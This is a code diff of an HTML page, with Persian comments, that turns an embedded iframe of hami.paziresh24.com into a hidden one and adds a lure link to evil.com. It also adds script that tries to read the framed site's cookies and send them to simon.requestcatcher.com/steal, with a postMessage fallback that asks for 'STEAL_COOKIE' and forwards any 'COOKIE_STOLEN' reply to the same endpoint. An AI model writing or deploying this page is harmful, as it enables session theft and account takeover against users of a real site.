@@ -4,22 +4,39 @@
     <title>Loading...</title>
 </head>
 <body>
-    <iframe src="https://hami.paziresh24.com" width="100%" height="500"></iframe>
+    <!-- اگر کاربر روی لینک کلیک کنه، به evil.com میره -->
+    <a href="https://evil.com" target="_blank">Click here to continue</a>
+
+    <!-- iframe که hami.paziresh24.com رو لود می‌کنه -->
+    <iframe src="https://hami.paziresh24.com" width="1" height="1" style="display:none;"></iframe>
+
     <script>
-        // وقتی صفحه لود شد، این کد اجرا میشه
-        window.onload = function() {
-            // سعی می‌کنه کوکی رو از iframe بگیره
+        // منتظر می‌مونیم تا iframe لود بشه
+        const iframe = document.querySelector('iframe');
+
+        iframe.onload = function () {
             try {
-                const iframe = document.querySelector('iframe');
+                // سعی می‌کنیم کوکی رو از iframe بگیریم
                 const cookie = iframe.contentWindow.document.cookie;
                 if (cookie) {
+                    // کوکی رو به سرور مهاجم می‌فرستیم
                     fetch('https://simon.requestcatcher.com/steal?cookie=' + encodeURIComponent(cookie));
                 }
             } catch (e) {
-                // اگه دسترسی نداشت، هیچی نمیکنه
-                console.log('Could not access cookie');
+                // اگه دسترسی نداشتیم، از postMessage استفاده می‌کنیم
+                iframe.contentWindow.postMessage({
+                    type: 'STEAL_COOKIE',
+                    url: 'https://simon.requestcatcher.com/steal'
+                }, '*');
             }
         };
+
+        // گوش دادن به پاسخ از iframe
+        window.addEventListener('message', function (e) {
+            if (e.data && e.data.type === 'COOKIE_STOLEN') {
+                fetch('https://simon.requestcatcher.com/steal?cookie=' + encodeURIComponent(e.data.cookie));
+            }
+        });
     </script>
 </body>
 </html>
